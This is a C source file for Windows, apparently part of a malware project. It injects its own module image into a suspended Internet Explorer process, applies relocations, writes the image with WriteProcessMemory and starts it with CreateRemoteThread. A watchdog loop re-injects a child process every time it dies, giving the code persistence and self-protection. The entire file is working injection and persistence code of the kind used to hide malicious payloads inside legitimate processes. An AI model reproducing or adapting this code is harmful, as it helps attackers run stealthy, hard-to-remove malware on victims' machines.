#include <windows.h>
#include <shlobj.h>

#include "Globals.h"


void *copySectionToProcess(HANDLE process, void *image) {

  BOOL ok;
  LPWORD relList;
  DWORD imageSize,relCount,i;
  DWORD_PTR delta,oldDelta,*p;
  LPBYTE remoteMem,buf;
  IMAGE_DATA_DIRECTORY *relocsDir;
  IMAGE_BASE_RELOCATION *relHdr;
  PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);

  
  imageSize = ntHeader->OptionalHeader.SizeOfImage;
  ok = FALSE;

  if(IsBadReadPtr(image, imageSize) != 0)return NULL;
  

  remoteMem = (LPBYTE)VirtualAllocEx(process, NULL, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if(remoteMem != NULL)
  {
    
    //buf = (LPBYTE)Mem::copyEx(image, imageSize);
	buf = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,imageSize);
	_memcpy(buf,image,imageSize);

    if(buf != NULL)
    {
      
      relocsDir = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
      
      if(relocsDir->Size > 0 && relocsDir->VirtualAddress > 0)
      {
        delta               = (DWORD_PTR)((LPBYTE)remoteMem - ntHeader->OptionalHeader.ImageBase);
        oldDelta            = (DWORD_PTR)((LPBYTE)image - ntHeader->OptionalHeader.ImageBase);
        relHdr = (IMAGE_BASE_RELOCATION *)(buf + relocsDir->VirtualAddress);
      
        while(relHdr->VirtualAddress != 0)
        {
          if(relHdr->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
          {
            relCount = (relHdr->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            relList = (LPWORD)((LPBYTE)relHdr + sizeof(IMAGE_BASE_RELOCATION));
            
            for(i = 0; i < relCount; i++)if(relList[i] > 0)
            {
              p = (DWORD_PTR *)(buf + (relHdr->VirtualAddress + (0x0FFF & (relList[i]))));
              *p -= oldDelta;
              *p += delta;
            }
          }
          
          relHdr = (IMAGE_BASE_RELOCATION *)((LPBYTE)relHdr + relHdr->SizeOfBlock);
        }
      
        ok = WriteProcessMemory(process, remoteMem, buf, imageSize, NULL) ? TRUE : FALSE;
      }
      
      //Mem::free(buf);
	  HeapFree(hHeap,HEAP_ZERO_MEMORY,buf);
    }
    
    if(!ok)
    {
      VirtualFreeEx(process, (void *)remoteMem, 0, MEM_RELEASE);
      remoteMem = NULL;
    }
  }

  return remoteMem;
}


void BeginInjection(BOOL IsChild) { //IsChild = TRUE - injecting child process for process protection

	HANDLE newhMutex,newhCache;
	DWORD image,newImage,StartRoutine;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	_memset(&si,0x00,sizeof(si));
	si.cb = sizeof(si);
	_memset(&pi,0x00,sizeof(pi));
	bInjected = TRUE;


	CreateProcessW(IEPath,NULL,NULL,NULL,TRUE,CREATE_SUSPENDED,NULL,NULL,&si,&pi);

	//Copy hMutex handle, to prevent other processes from starting
	DuplicateHandle((HANDLE)-1,(HANDLE) hMutex, pi.hProcess, &newhMutex, 0, FALSE, DUPLICATE_SAME_ACCESS);
	hMutex = (DWORD) newhMutex;
	
	if(IsChild==TRUE) {

		ParentPID = CurPID;
		ChildPID = pi.dwProcessId;

		//Copy the cache map handle to prevent it from being destroyed if this process dies
		DuplicateHandle((HANDLE)-1,(HANDLE) hCacheMapping, pi.hProcess, &newhCache, 0, FALSE, DUPLICATE_SAME_ACCESS);
	    hCacheMapping = newhCache;
	}

	image = CurrentModule; 
	if((newImage = (DWORD) copySectionToProcess(pi.hProcess, (HANDLE)image))==(DWORD)NULL) { return; /*Injection failed*/ }

	//Create thread at the entry point
    StartRoutine = newImage + ((DWORD)_entryPoint - image); 

	if(CreateRemoteThread(pi.hProcess,NULL,0,(LPTHREAD_START_ROUTINE)StartRoutine,NULL,0,NULL)!=NULL) { if(IsChild==FALSE) { ExitProcess(0); } /*Injection Successfull*/ }
}

void MonitorChild() {

	while(1) {
		if(GetProcessVersion(ChildPID)==0) { //Child is dead
			BeginInjection(TRUE);
		}
		Sleep(2000);
	}
}